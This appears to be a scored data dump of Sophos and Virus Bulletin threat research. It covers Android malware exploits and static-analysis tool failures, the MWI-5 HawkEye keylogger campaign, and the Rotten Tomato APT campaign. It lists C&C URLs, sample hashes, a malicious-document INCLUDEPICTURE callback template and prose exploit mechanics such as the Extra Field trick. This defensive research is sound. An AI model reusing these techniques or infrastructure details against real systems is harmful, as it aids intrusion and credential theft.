In this paper, we will investigate Android malware that has attempted to exploit vulnerabilities, and identify the most relevant threat families from the perspective of static analysis tools. The research will reveal the evolution of the threat families. Additionally, we will provide an evaluation of the various analysis tools that are currently available, exploring their successes and failures, and highlighting the differences between them. These results will be used to identify the best approach for future analysis, to ensure it keeps up with the rapid development of Android malware, and the increasing sophistication of device exploitation.",0.012663525566488754
"1. Introduction
According to Gartner [1], collectively, 2.5 billion devices are expected to be shipped in 2014, with Android expected to be loaded on more than one billion of them (see Figure 1).
Figure 1. Worldwide device shipment by operating system (thousands of units).
The continuously growing popularity of Android devices, as well as the specifics of the Android environment, its open source nature, the non-complicated process of adding applications to Google Play and other Android application markets, forums and file sharing sites, plus the possibility of redistribution in the form of ‘cracked’ and repackaged apps, all make it the number one target for mobile malware writers, with the number of malware samples in our database reaching 900,000 this year (see Figure 2).
Figure 2. Android malware samples timeline.
It also means that exploitation of security vulnerabilities is inevitable, and it is important to acknowledge the risk of exploitation of vulnerabilities by malware.
The cumulative share of malware samples exploiting different vulnerabilities has reached 10% (Figure 3).
Figure 3. Share of malware exploit samples.
But when we consider the significance of the prevalent malware families that have surfaced over years, there are several well known families that have used an exploit(s). In this paper, we will aim to identify those families based on our collection of Android malware samples.
We will concentrate on Android exploits and their evolution by evaluating malware families using static analysis tools. We will look at the important families that have used exploits to obtain access to and gain control of infected devices, limiting our research to the families that could be considered as the most well known for exploiting one vulnerability or more.
We will evaluate popular analysis tools by running them against malware families containing the exploits and analysing the results. We will look at how successful they are, highlight their failures, and document our case studies in order to identify the best approach for similar cases in the future.
Our aim is to show how the development of Android malware and the increasing sophistication of Android exploits has made popular static analysis tools unreliable.
We will argue that the evolution of exploits needs to be matched by the development of analysis tools, and highlight the need to develop more robust static and dynamic tools in the future.",0.017962145280029818
"2. Exploits overview
Based on Common Vulnerabilities and Exposures (CVE) data [2], the total number of documented Android vulnerabilities has reached 36, with seven of them discovered in the last year, and six in the first quarter of 2014.
Since it began in 2010, the evolution of Android malware can be matched with the exploitation of Android vulnerabilities. Based on our samples, we will take a closer look at those that we think are the most significant milestones.
Android vulnerabilities exploitation timeline:
Q4 2010: Android WebKit browser exploit
Q4 2010: Android data-stealing vulnerability
Q1 2011: Android local root exploit, a.k.a .‘Rage against the cage’ or ‘Lotoor’ exploit
Q2 2011: Android ClientLogin protocol vulnerability
Q3 2011: Android Gingerbreak root exploit, a.k.a. CVE 2011-1823
2012 …
Q2 2013: Dex2jar exploitation
Q2 2013: ‘Master Key’ vulnerability
Q3 2013: ‘Extra Field’ vulnerability",0.009434238887846558
3. Exploits evolution,0.0075067141401155
"3.1 Android WebKit browser exploit
The first serious proof-of-concept exploit for the Android platform was related to the Android WebKit browser and, while it was not related only to Android OS (and thus was not a platform vulnerability), it allowed remote attackers to execute arbitrary code or cause a denial of service (application crash) via a crafted HTML document, related to non-standard NaN representation. In other words, it was making Android devices vulnerable to drive-by exploits [3].
It has been reported that the targeted vulnerability was fixed by Google in the following Android release (2.2 Froyo). According to Google, Froyo was used by 36% of all Android devices at the time – which meant that the majority of devices could still successfully be attacked using the exploit [4].",0.010616283482309252
"3.2 Android data-stealing vulnerability
Next on our list is an Android data-stealing vulnerability [5], a general vulnerability in Android which allowed a malicious website to obtain the contents of any file stored on the device’s SD card. It would also be possible to retrieve a limited range of other data and files stored on the phone using this vulnerability. This is a simple exploit involving JavaScript and redirects, meaning it should also work on multiple handsets and multiple Android versions without any effort. One limiting factor of this exploit is that you have to know the name and path of the file you want to steal. However, there are a number of applications that store data with consistent names on the SD card, and pictures taken on the camera are stored with a consistent naming convention too, so it is not hard to guess the correct names and paths. This is not a root exploit either, meaning it runs within the Android sandbox and cannot reach all files on the system, only those on the SD card and a limited number of others.",0.008017621984413581
"3.3 Android local root exploit, a.k.a. ‘rage against the cage’ or ‘Lotoor’ exploit
At the beginning of 2011, the Android root was attacked by exploiting privilege escalation. Both exploits for the Linux kernel udev vulnerability and an adb privilege escalation attack are relatively old, but they worked with the versions of Android used by the majority of Android phones.
Note that we are still seeing samples with different variations of this exploit. The cumulative share of malware samples that use variations of this exploit has reached 2% of the total number of samples, as shown in Figure 4.
Figure 4. Malware root exploit samples share.
When looking at the different pieces of malware that have taken advantage of this vulnerability, up to 14% is made up of variants of the so called ‘classic’ Android local root exploit samples based on using an ELF executable that comprises exploit code (see Figure 5).
Figure 5. Share of root-exploit-based malware samples.
DroidKungFu is a well-known malware family that has taken root exploitation to a different level – it alone accounts for 15% of root-exploit-based malware samples.
DroidKungFu was included in repackaged apps that were made available through a number of alternative app markets and forums targeting Chinese-speaking users. This malware would add into the infected app a new service and a new receiver. The receiver would be notified when the system finished booting so that it could automatically launch the service without user interaction. DroidKungFu had encrypted udev and ‘rage against the cage’ exploits, and decrypted them upon running, executing and launching the attack.
Reports suggest that Gingerbread (Android 2.3) was the only Android version that was not vulnerable at the time, which would mean that 99% of Android phones were potentially affected.
Another 2% of the root exploits pie was occupied by the so called BaseBridge family. This malware used a privilege escalation exploit to elevate its privileges and install additional malicious apps onto an Android device. It used HTTP to communicate with a central server and leaked potentially identifiable information. These malicious apps could send and read SMS messages, potentially costing the user money. In fact, it could even scan incoming SMS messages and automatically remove warnings that alert the user to the fact that they are being charged a fee for using premium rate services.
Also, insignificant in share, but a piece of malware that attracted public attention at the time, is DroidDream. It surfaced in spring-summer 2011 and represents the first Android botnet to take advantage of a root exploit. DroidDream became an ‘Android Market nightmare’ when over 50 infected apps were identified and removed from the market [6].",0.021742764683456706
"3.4 Android ClientLogin protocol vulnerability
The Android ClientLogin protocol vulnerability has the highest score based on CVE details, and was discovered by German researchers in May 2011 [7]. It allowed remote attackers to gain privileges and access private data by interfering with the transmitting of an authentication token (authToken), meaning that it could potentially allow Wi-Fi traffic to be sniffed, and the authToken that had just been generated to be stolen. It has been reported that 99% of Android devices were at risk from this vulnerability at the time [8].",0.005795732862706848
"3.5 Android Gingerbreak root exploit
Another milestone in the evolution of exploiting vulnerabilities was claimed by GingerMaster, the first Android malware to use a root exploit on Android 2.3 (Gingerbread), CVE-2011-1823 [7]. It takes up 68% of the root exploits pie!
The GingerMaster malware was repackaged into popular legitimate apps in order to attract user downloads and installation. Within the repackaged apps, the malware registered a receiver so that it would be notified when the system finished booting. Inside the receiver, it would silently launch a service in the background. Accordingly, the background service would collect various pieces of information including the device ID, phone number and others (e.g. by reading /proc/cpuinfo) and then upload the information to a remote server. The actual exploit was packaged into the infected app in the form of a regular file named ‘gbfm.png’, which could be deciphered as ‘Ginger Break for Me’ (see Figure 6 and Figure 7).
Figure 6. Inside GMaster APK, exploit code in a picture file.
Figure 7. Inside GMaster APK, exploit code in a picture file.
(Click here to view a larger version of Figure 7.)",0.011713573492134977
"3.6 Dex2jar exploitation: Obad
Labelled as one of the worst trojans ever, Obad hit the headlines in June 2013. It combined a few unknown exploits and made analysis incredibly difficult. Obad exploited the way in which the OS was processing the AndroidManifest.xml file (which is generated during the build process, and contains information about the application structure, including how different components are related and launched, as well as what permissions an application requests). Obad’s authors also found a way to silently extend Device Administrator privileges so that the malware would not appear on the list of the applications running with these privileges. In addition, the malware authors introduced complex code encryption, with all external methods called via reflection, and all strings encrypted, including the names of classes and methods. Each class would have a local descriptor method which would obtain the string required for encryption from the locally updated byte array. See Figure 8  and Figure 9.
Figure 8. Obad obfuscation, example of decompiled by dex2jar dex code output.
Figure 9. Obad obfuscation, example of decompiled by dex2jar dex code output.
From our point of view, however, Obad was most famous for finding an error in the dex2jar software. Dex2jar is one of the most popular and well-used static analysis tools. The disruption of the conversion of Davlik bytecode into Java bytecode by finding an error in the software was quite significant as it made static analysis extremely difficult.",0.015535646739791686
"3.7 ‘Master Key’ vulnerability
In July 2013, it was reported that an Android APK signing had been compromised. The error was found in the way cryptographic signatures for applications were handled – this allowed attackers to execute arbitrary code via an application package file (APK) that is modified in a way that does not violate the cryptographic signature: CVE -2013-4787, a.k.a. Android security bug 8219321 and the ‘Master Key’ vulnerability [2]. In short, the application update validation process was compromised: it was found possible to repackage a legitimate application while inserting malicious code in the form of duplicates of the original AndroidManifest and classes.dex files, thus providing a way for a legitimate app to be updated with a malicious version.
An interesting addition to this vulnerability is that the simple unpacking of an APK using any Zip-based unpacker will overwrite multiple files unless special settings are applied, thus complicating static analysis. See Figure 10.
Figure 10. Inside ‘Master Key’ malware, example of multiple files.",0.011193736915936836
"3.8 ‘Extra Field’ vulnerability
Following in the steps of ‘Master Key’, just a couple of weeks later a similar vulnerability that would allow the bypassing of code verification was found by Chinese researchers [9]. It was based on the way in which an APK file is verified as an archive and used an object extra field, hence the name ‘Extra Field’ vulnerability. It did not reach the same sample numbers as the ‘Master Key’ vulnerability, but was reported to have comparable possible implications due to the fact that it exploited fundamentals of the Android APK, which is a ZIP archive with some special object fields. The flaw was based on a signed unsigned integer mismatch and, as some researchers have pointed out, relevant code testing could have prevented it [10]. Recognition of the exploited APK is based on identifying an object in a ZIP archive with the changed extra field length followed by the filename ‘classes.dex’, where the extra field length is FDFF, i.e. 65,533 (unsigned) or -3 (signed), as shown in Figure 11.
Figure 11. Example of malware exploiting the ‘Extra Field’ vulnerability, showing a changed field.
The fact that it was treated as a signed integer during the classes.dex checksum verification forced a verifier to step back exactly three bytes and read bytes starting from the ‘dex’ characters and following the contents of the extra field. However, on loading an APK, FDFF is treated as an unsigned integer, which causes the loader to go forward for the length of the extra field, i.e. 65,533 bytes. This could result in the loading of the malicious code that has been inserted into the hacked APK.
Google responded with a fix labelled ‘Values in ZIP are unsigned’ [11]. Both the ‘Master Key’ and ‘Extra Field’ vulnerabilities were based on compromising an Android app installer package (APK).",0.012550312610316916
"4. Static analysis techniques and tools
In this section we will provide an overview of the static analysis techniques and tools used for analysing Android malware. There are different approaches for static analysis according to one’s knowledge and tools arsenal, but here we will discuss the most widely used and straightforward technique. We can broadly classify the static analysis steps as follows:
Unarchiving – the APK file is in ZIP format, to verify its contents we need to extract them using tools like UnZip.
Decoding – AndroidManifest.xml and Resources.arsc are decoded using tools like apktool and Androguard.
Decompiling .dex – dex2jar and jd-gui are used for converting .dex files to .jar format, and then decompiling to Java code respectively.
Disassembling .dex – smali/baksmali and IDA Pro can be used to disassemble the .dex files.",0.02269952003858
"5. Evaluation of static analysis tools against exploit samples
In this section, static analysis tools will be evaluated against popular exploit samples to highlight the challenges faced when analysing such samples. We won’t explain the whole of each exploit, as we have already discussed the details earlier in the paper. Instead, we will discuss only the part that is relevant to the tools analysis. Although we have evaluated tools in the context of exploit samples, most of the evaluation will also be applicable to malware samples that don’t use any exploits. The methodology used was to run the samples as an analyst would to verify for analysis, and all the samples that weren’t successful in executing, or that posed a challenge for analysis, are discussed below.
The set of samples evaluated were:
Andr/MstrKey
Andr/DroidD (DroidDream)
Andr/DroidRt
Andr/Obad
Andr/Kongfu (DroidKungFu)
Andr/Gmaster (GinMaster)",0.01331310779713557
"5.1 Andr/MstrKey-A – challenge of multiple entries of the same file
Andr/MstrKey-A SHA1 – (APK) 78adcaa663d0f33ca014080870ff7a7e27461086
The Master Key vulnerability works by having multiple entries of the same filename [12]. As shown in Figure 12, there are multiple classes.dex, AndroidManifest.xml and icon.png files.
Figure 12. Andr/MstrKey-A APK file showing multiple files with the same name.
Because of the duplicate entries with same name, we should pay extra attention when using analysis tools to achieve what we want.
As the APK file is in ZIP format, the first thing we should do is to extract the APK to verify the classes.dex and AndroidManifest.xml files. When you try to extract the archive contents, if you are not aware of the exploit, it is possible to unintentionally overwrite the files with similar names, as shown in Figure 13.
Figure 13. UnZip prompting to replace the existing file.
The exploited APK file used for testing has two AndroidManifest files and two classes.dex files. Apktool is the tool most commonly used to decode AndroidManifest.xml files and generate smali code from classes.dex. In this case, apktool (v1. 5.2) decodes just one AndroidManifest file and one classes.dex file, but the dodgy permissions and code are in the other set of files. In order to decode these files, you have to fix the APK manually to decode the right files, or else decode them yourself manually. Even though this tool is designed to decode only one set of files, it would be useful for it to be able to decode more than one set in future.
Figure 14. Files after the ‘apktool d’ command.",0.01581822033935898
"5.2 Andr/DroidD – Dex header issue
SHA (dex) – b5b41c7c75182ced4121d01a6328f626aaf5a997
We came across an Andr/DroidD-Gen sample which IDA Pro showed as corrupt (Figure 15). When we investigated, we found that the classes.dex file in question had a dex036 header (Figure 16).
Figure 15. IDA 6.4adv corrupt error message.
Figure 16. Dex file with dex036 header.
According to the dex file format [13], the first eight bytes of the dex file are DEX_FILE_MAGIC (Figure 17), with ‘dex\n<2 byte version number>\0’. In our database, we found that most of the malware had dex035 headers – which is an older, but still recognized version (API level 13 and earlier), and dex036 is used in the current version (4.x) of dex files [14]. This issue had already been noticed in IDA, and a fix has been made available [15], but at the time of writing this paper we still don’t have a fix available for the default installation of IDA version 6.4adv.
Figure 17. Dex header format to offset 0x28.",0.015267303736964055
"5.3 Android/DroidRt, Andr/Obad-A – use of unfamiliar opcodes and decompilation
SHA (dex) – 90462f3ada7f4d551fc8f7d1e2672c4eea9e8cc8
In Windows PE files it is common to see use of obfuscation and anti-analysis codes in order to hinder sample analysis. We have seen previous work where illegal and improper use of opcodes has been suggested to break analysis tools [16]. Malware authors and developers of commercial packers are aware of this, and use this technique extensively to make analysis of samples difficult.
We encountered an Andr/DroidRt sample which failed to decompile with dex2jar (Figure 18).
Figure 18. Error on dex2jar decompilation of file.
(Click here to view a larger version of Figure 18.)
Dex2jar failed, saying that the format for opcode 64 could not be found. The opcode 64 documentation says ‘Reads the byte static field identified by the field_id into vx’ [16] – unfamiliar opcodes are usually used to delay reversing. Inserting junk bytes and bad opcodes is a known technique for thwarting reverse engineering, and in the past researchers have shown how insertion of these opcodes has broken analysis tools [16], [17] (these techniques are still used effectively). As an added bonus, this sample also failed to work with baksmali 1.4.1 (Figure 19), but managed to work with the 2.03 version.
Figure 19. Error on baksmali 1.4.1, but works with baksmali 2.03.
(Click here to view a larger version of Figure 19.)
Obad has been called one of the most advanced pieces of Android malware. It has posed challenges in static analysis as it takes advantage of a vulnerability in the Davlik to Java conversion in dex2jar [18] (Figure 20).
Figure 20. Decompiled Obad file with error.
(Click here to view a larger version of Figure 20.)
Because of the error, the analyst would not be able to see a proper decompiled representation of the code and could come to the wrong conclusion if not analysed correctly. Obad is protected with the dexguard commercial packer [19] – this means that any application protected with this packer will produce the same issue with dex2jar.",0.017797595708679004
"6. Best approach
From our evaluation, we have found that several popular and commonly used tools are not suitable for effective static analysis of certain Android malware samples. While Android malware is growing both in complexity and volume at an exponential rate, the development of new tools and maintenance of existing ones are not matching that pace.
Even though most of the errors and tricks employed by malware authors to break analysis tools have been known to researchers for a while, the tools are not sufficiently well maintained to implement the necessary changes to overcome these issues. The Android SDK tools baksmali/smali are updated frequently, but they alone are not sufficient to provide full in-depth analysis of malware. In order to be able to understand how complex sophisticated malware works, analysts have to combine static analysis with dynamic tools. The consequence of this is that it buys more time for malware authors to continue their work while analysts spend more time analysing the samples. As a result, the security of Android applications and users is affected. To tackle this problem, Google should provide resources and funding for widely used tools and maintain them with regular updates to keep in line with malware advancements. Static analysis should be combined with the dynamic and sandbox environment.",0.01805789774908928
"7. Conclusion
Android malware is growing at a steady rate to match its counterparts in the PC world – we already have several malware families using Android exploits. From a web browser exploit to extensive root exploitation, cybercriminals have created complex pieces of malware that comprise multiple exploits and have a high level of obfuscation. Even an Android application installer, an APK file validation, has been compromised. By comparing the evolution of Android malware from an exploitation of vulnerabilities point of view with the evolution of tools used to analyse the exploit samples, we conclude that existing tools are not sufficiently well maintained to match advancements in malware.
We would like to add that, despite the fact that Google constantly attempts to improve its app verification processes, it is obvious that it is just playing catch-up. We keep seeing cases that involve compromised applications, whether it is down to the process of signature verification or compromised signatures. We anticipate that Android malware will grow and become more complex in the future. In order to combat it effectively, we need to find new ways of tackling it, keeping existing tools up to date and investing in new tools to make analysis easier.",0.013914961323216679
"Bibliography
[1] Gartner (March 2014). http://techcrunch.com/2014/03/ 27/gartner-devices-forecast-2014/.
[2] http://www.cvedetails.com/vulnerability-list/vendor_id-1224/product_id-19997/Google-Android.html&sa=X&ei=rxZ6U4u2N6XN7AaNlYG4BA&ved=0CCgQ7xYoAA&biw=1920&bih=846.
[3] http://www.cvedetails.com/vulnerability-list/vendor_id-1224/product_id-19997/Google-Android.html.
[4] http://nakedsecurity.sophos.com/2010/11/08/pressure-to-improve-android-security-is-building-up/.
[5] http://thomascannon.net/blog/2010/11/android-data-stealing-vulnerability/.
[6] http://www.pcworld.com/article/221247/droiddream_becomes_android_market_nightmare.html.
[7] CVE-2011-2344. http://www.cvedetails.com/vulnerability-list/vendor_id-1224/product_id-19997/Google-Android.html.
[8] http://www.uni-ulm.de/en/in/mi/staff/koenings/catching-authtokens.html.
[9] http://www.h-online.com/open/news/item/Second-Android-signature-attack-disclosed-1918061.html.
[10] Ducklin, P. Anatomy of another Android hole – Chinese researchers claim new code verification bypass. http://nakedsecurity.sophos.com/2013/07/17/anatomy-of-another-android-hole-chinese-researchers-claim-new-code-verification-bypass/.
[11] https://android.googlesource.com/platform/libcore/+/9edf43dfcc35c761d97eb9156ac4254152ddbc55.
[12] Ducklin, P. Anatomy of a security hole – Google’s ‘Android Master Key’ debacle explained. http://nakedsecurity.sophos.com/2013/07/10/anatomy-of-a-security-hole-googles-android-master-key-debacle-explained/.
[13] Dex File Format. http://source.android.com/devices/tech/dalvik/dex-format.html.
[14] Android 4.1.2 Dexfile.h source. http://osxr.org/android/source/dalvik/libdex/DexFile.h.
[15] http://www.strazzere.com/blog/2013/02/loose-documentation-leads-to-easy-disassembler-breakages/.
[16] http://pallergabor.uw.hu/androidblog/dalvik_opcodes.html.
[17] http://archive.hack.lu/2013/AbusingDalvikBeyondRecognition.pdf.
[18] Dex2Jar. http://code.google.com/p/dex2jar/.
[19] Dexguard. http://www.saikoa.com/dexguard.
[20] Unzip. http://linux.about.com/od/commands/l/blcmdl1_unzip.htm.
[21] Unuchek, R. The most sophisticated Android Trojan. https://www.securelist.com/en/blog/8106/The_most_sophisticated_Android_Trojan.
[22] http://www.strazzere.com/papers/DexEducation-PracticingSafeDex.pdf.
",0.012527277253228553
"MWI-5: Operation HawkEye
2015-10-13",0.010610513690883616
"Gabor Szappanos
Sophos
,
Hungary
Editor:
Martijn",0.00906241388508322
"Grooten
Abstract
Gabor Szappanos looks at a series of malware campaigns that used Office macros to download the commercial HawkEye keylogger.
Copyright © 2015 Virus Bulletin",0.01423661997978587
"While Microsoft Office malware is no longer as prevalent as it was in the 1990s, it retains a notable presence. In place of the previously dominant macro viruses, nowadays we see downloader and dropper trojans that are used in spear phishing and targeted email attacks. In these efforts the criminals rely on malware generators.
The most influential Office malware creation kit today is Microsoft Word Intruder (MWI), developed in Russia.
Despite its influence, MWI was unknown to the general public until FireEye released a blog entry describing it early in 2015 [1]. Shortly after that, further reports surfaced [2], [3], [4], [5]. However, these reports turned out just to be the tip of the iceberg.
Attacks launched with the help of MWI are usually deliberately kept small. Some cybercrime groups appear to be changing their tactics: instead of aiming to infect hundreds of thousands of computers they infect a few thousand or even just a few dozen victims at a time. This approach helps them to stay under the radar and avoid unwanted attention.
In a recent piece of research we mapped out a wide variety of MWI attacks that took place between May and August 2015 [6]. The research paper provides detailed information about the internals of MWI and the additional server-side module, MWISTAT. In this article we will assume that the reader is already familiar with those details.
We followed at least a dozen different cybercrime groups that have used the MWI malware generator to deploy more than 40 different malware families.
In this article we detail one particular distribution operation, during which a commercial keylogger application was distributed in large parts of Asia.",0.01523897077372105
"Infection vector
The infection campaigns were observed from the middle of March 2015 and lasted until the end of July 2015, using two different MWISTAT servers. After this period we observed no further activity.
The primary infection vector used in this operation consisted of spear-phishing email messages with exploited Rich Text Format (RTF) documents as attachments. The documents were generated with Microsoft Word Intruder.
The email messages used the theme of purchase requests from India to Vietnam, which correlates well with the regional focus of the operation – as we will see later, these two countries were among the main targets.
Figure 1. The email messages used the theme of purchase requests.
Later on, after the first C&C server was shut down, the criminals switched to a new server. In this period we observed a different phishing theme, featuring a bank transaction receipt.
Figure 2. A different phishing theme was observed, featuring a bank transaction receipt.
We found a handful of different documents used by the group as email attachments over time, as shown in Table 1.
First seen
Original name
SHA1
13/03/2015
Vietnam order.doc
bec0dbb5bd468da8f92a038d547f8e3e3bfef828
27/05/2015
Plans and Designs.doc
80ac4199c7c519cbbcc04087a684b776cfe2b24a
29/05/2015
Invoice.doc
4aa4e3d70a5af774d95db2a1926fc2c455072f73
08/06/2015",0.016123706976240437
"8b628278c6b032b26ac5cac84abbdb1ab0777668
08/06/2015
Payment Copy.doc
2894a0e6bf28e18cf820064dc1ad12d0fee05052
09/06/2015",0.009749699801380518
"e9e294e6cfaf064373e4600319657f69e2bed278
11/06/2015
Label Sample.doc
8afd513d177f99fe4ef95ba5a26c009f9e48b637
11/06/2015
Original BL
b724a030ef3d3ca5aacba76c11bbeb72193f7558
11/06/2015",0.012305086848968694
"27f59ac9b5796b46bb13cf9dc85bb5e8893a96d5
12/06/2015
Remodel+plan.doc
bbb7e5d092f7e4a56cf0be51d1c586c61f63f44d
15/06/2015
Shipping Doc.doc
bb33f094b2f9c940b25518efcb9eb1dc38612be8
28/07/2015
Payment copy.eml
9aa2372ebaac689c503a07a693a305aa845539b2
28/07/2015
PO_Vietnam Order.doc
05468cb85b2ef4f63ffc2256414eb984315e7600
28/07/2015",0.010597402760724517
"c17f283852e9054c5a99fab2ced81dcdb7717ae0
28/07/2015",0.009279337450771807
"5cc410e31e5e84e980039e99cae47cbabae85a5c
Table 1. A handful of the documents used by the group over time.
The original name of the attachments suggests that most distribution campaigns used one of the two previously mentioned themes (shipping labels or payment receipts).",0.01454386084978676
"Distributed payload
All of the exploited document samples were downloaders that installed the HawkEye password stealer program.
When the attached document was opened, the payload was downloaded and executed; this installed the HawkEye keylogger, which immediately started to gather user credentials (Figure 3). HawkEye is a commercial keylogger tool [7] that logs keystrokes and clipboard content, and can gather all imaginable passwords.
Figure 3. The HawkEye keylogger was installed and immediately started to gather user credentials.
The product supports email or web upload for the stolen information, but in the scope of this operation the FTP drop method was the most commonly used. However, there is evidence that at some point the criminals also tried email submission.
The stolen information was uploaded at regular intervals to the server. The capture files are plaintext with content similar to that shown in Figure 4.
Figure 4. The capture files are plaintext with content similar to this.
HawkEye seems to be a popular choice in crimeware operations: recent encounters have been documented in [8] and [9]. Further evidence indicates that MWI-5 was very likely operated by the criminal group identified in the Trend Micro report.",0.01330504692359169
"Server architecture
Over the duration of the operation the following servers were used as MWISTAT C&C servers:
six-bro.com
amittrade.com
Six-bro.com was the server that was most actively used during the campaigns. Our data indicates that operations related to this server began in mid-March, and finished at the end of June 2015, when the server was shut down.
During the server’s active period, multiple installation directories were observed, with MWISTAT apparently installed under three different subdirectories: webstat, webbie and wbst (see Table 2).
2015-06-12
http://six-bro.com/webstat/img.php?id=70998668
2015-06-12
http://six-bro.com/webstat/img.php?id=33816634
2015-06-12
http://six-bro.com/webstat/img.php?id=23900374
2015-06-11
http://six-bro.com/webstat/img.php?id=12464729
2015-06-11
http://six-bro.com/webstat/img.php?id=38915948
2015-06-09
http://six-bro.com/webstat/img.php?id=55731239
2015-06-08
http://six-bro.com/webstat/img.php?id=82357659
2015-06-08
http://six-bro.com/webstat/img.php?id=88290212
2015-05-29
http://six-bro.com/webstat/img.php?id=50981746
2015-04-22
http://six-bro.com/webbie/img.php?id=90222451
2015-04-20
http://six-bro.com/webbie/img.php?id=84085197
2015-04-20
http://six-bro.com/webbie/img.php?id=95536720
2015-03-20
http://six-bro.com/wbst/image.php?id=88321021
2015-03-17
http://six-bro.com/wbst/image.php?id=89864851
2015-03-17
http://six-bro.com/wbst/image.php?id=40074095
2015-03-13
http://six-bro.com/webstat/image.php?id=35878151
Table 2. MWISTAT was apparently installed under three different subdirectories: webstat, webbie and wbst.
This is not unusual; the same behaviour was observed by Check Point researchers [10], in their case with seven different install locations. The reason could be the same in both cases: upgrade of the MWISTAT software to a new version. The criminals probably didn’t want to overwrite the already up and running installation with the new release, and instead created a new installation directory, and the new campaigns started to use the new version.
While the six-bro.com server was active, another domain, labelcounty.com, pointed to the same IP address. That alone would not indicate a connection; six-bro.com was hosted on namecheap.com, using shared IP addresses – dozens of domains pointed to the same IP address. However, the web server itself contained a subdirectory (www.six-bro.com/labelcounty.com) with the content shown in Figure 5.
Figure 5. Content of the subdirectory www.six-bro.com/labelcounty.com.
At the time of writing this article, the primary C&C domain has been shut down, labelcounty.com has been moved to a different location, but the content is still the same ‘under-construction’ page. There is no track record for this server, either for malicious or benevolent use of it. It is likely that the criminals are keeping it for a future opportunity.
The six-bro.com domain was shut down in the middle of July 2015. This was not a hacked domain; it was registered and maintained by the criminals. By the end of that month the operation had been transferred to the second C&C domain, amittrade.com, also maintained by the criminals, where it ran until the end of July. The last sample related to this operation was observed on 28 July 2015.
The overall purpose of the operation is not absolutely clear, but we can make educated guesses. HawkEye is capable of stealing a very wide range of credentials, along with keylogs and clipboard data. There are many possible uses for the stolen data, ranging from industrial espionage to identity theft. However, there is some indication that in this case the attackers were interested in banking credentials.
The six-bro.com domain contained another interesting subpage, which was a fully featured online banking page, perfectly suited for phishing attacks (Figure 6).
Figure 6. A fully featured online banking page on a subpage of the six-bro.com domain.
Coincidentally, six-bro.com was reported as a fake banking site [11] with the same National Bank theme. It seems that the criminals tried to reuse components from an earlier banking scam site, nb-national.com [12], dating back to 2012, indicating prior interest in banking fraud. However, in this case, it is more likely that they were interested in using the stolen credentials to access corporate webmails, to gather information and use it in more targeted change of supplier fraud.",0.014656357185282354
"Campaign stats
The malicious documents contain the MWISTAT callback address in the following form:
INCLUDEPICTURE ""http://{serverpath}/{mainscript}?id={campaign_ID}
During this operation two different servers were used, and on the first server three different installations. Overall, we have seen 10 different campaign IDs, suggesting that at least 10 distribution campaigns were executed by the criminals.
The number of victims of the individual campaigns ranged widely between a few dozen and a few thousand. This is a low number compared to the reported number of ransomware or Zbot victims, but the terms and conditions of MWI do not permit larger campaigns. Nevertheless, it produces a solid income for the criminals.
The largest campaigns focused on the continents of Asia and Africa, the most affected countries being Indonesia, India, Thailand, Oman and Malaysia.
Figure 7. The most affected countries were Indonesia, India, Thailand, Oman and Malaysia.
Figure 8. Map of infected endpoints.",0.012268510485062056
"Summary
It is reasonable to assume that this MWI-related campaign is aimed at gathering user credentials, especially corporate webmail accounts.
The group behind the attack used email messages to reach their targets, with Rich Text Format documents as attachments. These documents exploited three different vulnerabilities: CVE-2012-0158, CVE-2013-3906 and CVE-2014-1761. Even CVE-2014-1761, the latest of the vulnerabilities, had been patched about a year before these attacks started.
It shouldn’t be difficult to protect against the activities of this group: simply applying the relevant patches for Microsoft Office should disarm the attack. Then there is only one remaining piece of advice: don’t fall for social engineering.",0.010951012202092603
"Bibliography
[1] https://www.fireeye.com/blog/threat-research/2015/04/a_new_word_document.html.
[2] http://blog.checkpoint.com/2015/06/26/microsoft-word-intruder-rtf-sample-analysis/.
[3] http://blog.0x3a.com/post/117760824504/analysis-of-a-microsoft-word-intruder-sample.
[4] https://www.proofpoint.com/threat-insight/post/Foot-in-the-Door.
[5] http://www.welivesecurity.com/2015/04/09/operation-buhtrap/.
[6] https://blogs.sophos.com/2015/09/02/microsoft-word-intruder-revealed-new-sophoslabs-research-goes-inside-a-malware-creation-kit/.
[7] http://hawkeyeproducts.com/.
[8] http://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/hawkeye-nigerian-cybercriminals-used-simple-keylogger-to-prey-on-smbs.
[9] http://www.isightpartners.com/2015/06/hawkeye-keylogger-campaigns-affect-multiple-industries/.
[10] http://blog.checkpoint.com/2015/06/26/microsoft-word-intruder-rtf-sample-analysis/.
[11] http://db.aa419.org/fakebanksview.php?key=94793.
[12] http://www.malwareurl.com/ns_listing.php?ip=176.8.205.173.
",0.011386011974538368
The Rotten Tomato Campaign: New SophosLabs research on APTs,0.010562703734465329
"Written by
John Zorabedian",0.00826774006182307
"October 30, 2014",0.008517602382646428
Network Partners Products & Services Threat Research Advanced persistent threats APT Gabor Szappanos malware PlugX Rotten Tomato Zbot,0.010753157519809764
"An advanced persistent threat (APT) malware campaign seen in August and September 2014 is the subject of new research by one of our threat analysts at SophosLabs.
Sophos is calling this malware campaign “Rotten Tomato,” in reference to the Tomato Garden campaign; and because some of the samples were rotten in the sense that they were not effectively executed.
In a new technical paper on the threat, Principal Threat Researcher Gabor Szappanos, of SophosLabs Hungary, writes an interesting dive into the world of the attackers, examining the malware used by cybercriminals in these attacks, and shows how several different groups used the same zero-day Microsoft Word exploit.",0.014868150023215065
"“There must have been a staff meeting, where the manager prompted that, in the next malware distribution campaign they should not only use the aging CVE-2012-0158 vulnerability, but the newer CVE-2014-1761 as well,” Gabor writes.
In Rotten Tomato, the groups somehow got hold of a document that exploited the vulnerability, left the exploiting document part and the shellcode intact, and only changed the appended encrypted executable at the end.
Gabor has followed the Plugx malware family for the past two years. By watching the evolution of malware samples over that period, Gabor has special insight into targeted attacks, and the attackers.
In a previous paper, in which Gabor asked “Are APTs the new normal?”, he wrote about how common malware groups copy APTs.
Now the Rotten Tomato campaign shows that APT authors are getting ideas from the common malware groups, Gabor says, as the narrow line between them is even harder to define.
Read Gabor’s research paper by clicking here: The Rotten Tomato Campaign.
About SophosLabs
SophosLabs is the global network of threat centers staffed by Sophos researchers and analysts. Keep up to date with our latest research and technical papers, expert opinion, and security advice at Naked Security.
Follow us on your favorite social media networks, chat with us in our forums, download our informative podcasts, or sign up for our RSS feeds.",0.014233816896910945
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
Share on LinkedIn,0.009855679767380665
"4
",0.008739321216238327
Patch now! Microsoft releases fixes for the serious SMB bug CVE-2020-0796,0.00882547370908171
"Written by
SophosLabs Offensive Security",0.008622298185940958
"March 12, 2020",0.008948097725331783
